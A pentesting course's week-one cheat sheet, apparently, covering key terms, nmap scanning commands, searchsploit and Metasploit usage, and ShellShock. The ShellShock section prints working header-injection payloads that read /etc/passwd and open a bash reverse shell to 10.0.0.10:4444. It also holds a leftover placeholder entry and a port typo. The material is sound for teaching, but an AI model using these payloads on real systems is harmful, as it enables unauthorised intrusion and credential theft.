# Pentesting Week 1 Cheat Sheet

## Day 1 Key Terms

- **Black-Box Penetration**: Testers are expected to attack the target as an outsider with no previous knowledge of the environment.
    > **Example**: Here testers are paid to learn as much as they can about the environment and it's vulnerabilities, from an outside perspective.

- **White-Box Penetration**: Testers have full knowledge of the environment allowing them to tear apart subtle security issues.
  > **Example**: This is most appropriate when the client wants a detailed analysis of all potential security flaws.

- **Pentesting Execution Standard (PTES)**: An industry standard framework for penetration testing.
  > **Example**: Steps for the PTES include:
      - Pre-engagement interaction
      - Intelligence gathering / mapping
      - Threat modeling
      - Vulnerability assessment
      - Exploitation
      - Post-exploitation
      - Reporting

- **Banner Grabbing**: entails opening a connection to a port and printing out anything that the servers sends within 5 seconds.
  > **Example**: Banner Grabbing is used to quickly determine what OS and services are being offered by a target.

- **Black-Box Penetration**: Definition
  > **Example**: Example usage here

## Day 2 Key Terms

- **ShellShock**: A bash exploit that allows an attacker to execute Bash commands with HTTP requests.

- **Common Gateway Interface (CGI)**: There are many ways to serve websites. One is called **CGI (Common Gateway Interface)**,  which defines a **standard**, or set of rules, that allows clients to run scripts on a server.
  > **Example**: A bug in CGI is what allows the ShellShock exploit to work.

- **BurpSuite**: A software suite that specializes in web vulnerability exploitation.

## Day 3 Key Terms

- **MSFconsole** is used for the reconnaissance, vulnerability analysis, and exploitation phases of a penetration test.
  > **Example**: MSFConsole uses 4 different types of modules:

    - **Auxiliary modules** are used for information gathering, enumeration, port scanning, and that sort of thing. There are plenty of useful tools in there too for things like connecting to SQL databases and even tools for performing man-in-the-middle attacks.

    - **Exploit modules** are generally used to deliver exploit code to a target system. You can also perform a search for modules using the search command.

    - **Post modules** offer post exploitation tools such as the ability to extract password hashes and access tokens and even modules for things like taking a screenshot, key-logging, and downloading files. You'll explore these during the next class.

    - **Payload modules** are used to create malicious payloads to use with an exploit. If possible, the aim would be to upload a copy of Meterpreter, which is the default payload of Metasploit.

- **Meterpreter** is a post-exploitation tool used to interact with compromised targets. Metasploit loads this automatically if an exploit is successful.

## Key Commands
### Nmap
Nmap is a network scanning tool that is used extensively during the Intelligence Gathering stage of a penetration test. It has many options and the most commonly used are listed for your convenience.
#### SYN Scan
You can run a SYN scan using the following command:

```bash
nmap -sS <Target IP Address>
```

#### UDP Port Scan
You can run a UDP scan against specific ports with the following command:

```bash
# Running a UDP scan against ports 53, 67, 68 and 69
nmap -sU -p53,67,68,69 <Target IP Address>
```
#### Banner Grabbing with nmap
You can perform service and version detection using the `-sV` flag:

```bash
nmap -sV <IP Address>
```

You can also use the `--script=banner` option:

```bash
nmap -sV --script=banner <IP Address>
```

#### Vulnerability Scanning with nmap

nmap has a vulnerability scanning function / extension that is easy to install and use.

To install `--script-vulners` option:

```bash
curl -o /usr/share/nmap/scripts/vulners.nse https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
```

Using `--script-vulners`:
```bash
nmap -sV --script-vulners <IP Address>
```


#### Run a ping sweep

An Nmap command to perform a ping sweep of the range 10.0.0.0 to 10.0.0.254.

```bash
#This reveals the hosts 10.0.0.10, 10.0.0.100, and 10.0.0.101.
nmap -sP 10.0.0.0-254.
```
Use Nmap to perform a ping sweep of your subnet. Save the results as XML.

```bash
#Save the results as /tmp/host_discovery
nmap -sP 10.0.0.0/24 -oX /tmp/host_discovery
```
#### Top Ports

Use --top-ports to scan the top 100 ports of the live hosts you discovered above.
```bash
nmap --top-ports 100 10.0.0.10 10.0.0.100-101
```

#### Check for ShellShock

Check to see if a host is vulnerable to ShellShock

```bash
# Scan 172.16.0.2 for ShellShock
$ nmap -sV -p- --script http-shellshock 172.16.0.2
```

#### Agressive Scan

Run an "aggressive" scan of the top 100 ports against the hosts in a list file. Options range between `T1` (stelth) and `T5` (Very Agressive) with `T4` used as a default.

```bash
# Run a scan against the file /tmp/live_hosts
nmap --top-ports 100 -T4 -i /tmp/live_hosts
```

#### Turn off Ping and DNS
Repeat the scan above on just one of the hosts on the network. This time, turn off host discovery and name resolution to reduce the amount of traffic you send.

```bash
# Scan 10.0.0.100 turning off Ping and DNS scans
nmap --top-ports 100 -T4 10.0.0.100 -Pn -n
```
#### Use the default scripts
Use the default set of nmap scripts to scan a host
```bash
# Scan host 172.16.1.45 with the default scripts
nmap -sC 172.16.1.45
```

<details>
  <summary>Expand for Explanations of more Nmap Flags</summary>
  <ul>
    <li><code>-oX</code>Save scan output to an XML file
    <li><code>-oN</code>Save scan output to a txt file
    <li><code>-sP</code>Ping Sweep
    <li><code>-sS</code> SYN Scan (TCP by default)
    <li><code>-sU</code> UDP Scan
    <li><code>-sV</code> Banner Grab
    <li><code>-p</code> Specify port(s)
  </ul>
</details>
        
### ShellShock

Bash does not sanitize headers before loading them as environment variables. This means it loads whatever value is sent in the header. For example, the request below results in `HTTP_USER_AGENT` being set to `() { :;};`. This is cryptic, but in vulnerable versions of Bash, this creates a function that does nothing.

```bash
GET /index.html HTTP/1.1
Host: example.com
User-Agent: () { :;};
Connection: keep-alive
```

Therefore, if you update the request above to the below, the server will run `echo "haxxed"`.

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; echo "haxxed"
  Connection: keep-alive
  ```
This allows you to execute arbitrary code on the server, including commands that open TCP connections back to your machine.

  ```bash
  GET /index.html HTTP/1.1
  Host: example.com
  User-Agent: () { :;}; /bin/bash -c "cat /etc/passwd"
  Connection: keep-alive
  ```
#### ShellShock Payload to Open a Shell Breakdown
```bash
# Here is a Shellshock Payload Example
User-Agent: () { :;};echo -e "\r\n$(/bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1)"`.
```
  - `User-Agent: () { :;};` exploits Shellshock by creating a function. The code after gets executed by the shell.

  - `echo -e "\r\n$(/bin/bash -i >& /dev/tcp/10.0.0.10/4444 0>&1)"`:

  - `/bin/bash -i >& /dev/tcp/10.0.0.10/444` means "Run a new Bash shell in interactive mode. Send std error and standard output to `10.0.0.10:4444` through a TCP connection.

  - `0>&1` means "Read standard input (`0`) to this new shell through the TCP connection."


### SearchSploit

SearchSploit allows you to search all of the exploits that you have in Kali Linux and even view their source code.

#### Search for exploits

```bash
# Search for apache exploits and view the first 10 findings.
searchsploit apache | head
```

#### View Source Code

```bash
# View the source code for the 29316.py exploit
searchsploit -x exploits/php/remote/29316.py
```

### MetaSploit

MetaSploit is an automated explanation tool. In the professional pentesting world, is has a bit of a stigma because it allows users to run exploits without fully understanding what they are doing. Many Job Interviews and Pentesting Engagements will not allow the use of Metasploit. Before using Metasploit, it is important to understand what exploits you are running and what they do.

#### Start Metasploit

```bash
# Start the database
msfdb init

# Start msfconsole
msfconsole
```
#### Search Metasploit
Search Metasploit for a Hearbleed Exploit

```bash
msf > search heartbleed
```

#### Use an Exploit

Load an exploit that you discovered with Metasploit

```bash
msf > use /path/to/exploit
```
View an exploit's options

```bash
msf exploit(/path/to/exploit) > show options
```

Set an option with `set <OPTION> <PARAMETER>`

```bash
# Set the RHOSTS option to 172.16.1.33
msf exploit(/path/to/exploit) > set RHOSTS 172.16.1.33
```

Check if an exploit is likely to work:

```bash
msf /path/to/exploit > check
```

Execute an exploit

```bash
msf /path/to/exploit > run
```

Change the payload of an exploit

```bash
msf /path/to/exploit > set PAYLOAD /path/to/payload
```
